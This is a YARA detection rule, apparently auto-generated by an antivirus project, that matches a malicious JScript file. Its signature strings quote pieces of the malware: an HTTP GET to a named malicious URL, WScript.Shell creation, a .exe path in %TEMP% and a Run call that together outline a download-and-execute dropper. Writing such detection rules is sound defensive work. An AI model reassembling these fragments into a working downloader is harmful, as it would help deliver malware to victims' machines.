rule sig_20160401_daf7fb243e3eb0bbdc50b6257d2d8023 {
  meta:
    description = "datamaliciousorder - file 20160401_daf7fb243e3eb0bbdc50b6257d2d8023.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b271d2ed82993ffbf1ca29a228f63c6a44e59496175901783701ad0ac242adac"

  strings:
    $s1  = "CudSl[UewAha](\"G\" + \"ET\", \"http://hotlinehomeappliances.com/l3ospa\", false);" fullword ascii
    $s2  = "var FdUg = function OcgDs() {return WScript[KuhYm](\"WScript\"+\".Shell\");}(), AsMd = 11;" fullword ascii
    $s3  = "function DyqZhn(RnxQw, KwkNuo){NcLwy = NcLwy * 1; return RnxQw - KwkNuo;};" fullword ascii
    $s4  = "if (CudSl[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function DvpIz() {return FdUg[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"cvsa3tiXMNR67cxJ.ex\" + \"e\";};" fullword ascii
    $s6  = "function QyRc(){return GaAoo + \"\";};" fullword ascii
    $s7  = "function WkcZse() {return ((EqVrq == true) && (EqVrq == QubCbw)) ? 1 : NcLwy;};" fullword ascii
    $s8  = "var EqVrq = false;" fullword ascii
    $s9  = "var KgDi = false;" fullword ascii
    $s10 = "function YawNwc(){return KuhYm;};" fullword ascii
    $s11 = "QubCbw = true; " fullword ascii
    $s12 = "}while (WljYnl);" fullword ascii
    $s13 = "var QubCbw = false;" fullword ascii
    $s14 = "return DyqZhn(VyhJdw, XdFn);" fullword ascii
    $s15 = "function YquPak(LcTpg) {var SiOn = (1, 2, 3, 4, 5, LcTpg); return SiOn;};" fullword ascii
    $s16 = "function MaxBt()" fullword ascii
    $s17 = "function QptLqu(TuGw){FdUg[\"R\"+\"un\"](TuGw, NcLwy, NcLwy);};" fullword ascii
    $s18 = "var DlWma = new this[\"Date\"]();" fullword ascii
    $s19 = "EqVrq = true; " fullword ascii
    $s20 = "function EhiAz(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}